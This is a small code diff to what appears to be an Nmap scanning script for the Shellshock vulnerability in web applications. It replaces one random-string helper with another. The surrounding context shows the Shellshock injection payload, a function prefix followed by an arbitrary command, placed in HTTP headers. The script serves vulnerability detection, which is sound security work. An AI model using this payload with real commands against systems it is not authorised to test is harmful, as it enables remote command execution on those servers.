@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local vulns = require "vulns"
+local rand = require "rand"
 
 description = [[
 Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications.
@@ -85,7 +86,7 @@ function generate_http_req(host, port, uri, custom_header, cmd)
   if cmd ~= nil then
     cmd = '() { :;}; '..cmd
  else
-    rnd = stdnse.generate_random_string(15)
+    rnd = rand.random_alpha(15)
     cmd = '() { :;}; echo; echo "'..rnd..'"'
   end
   -- Plant the payload in the HTTP headers
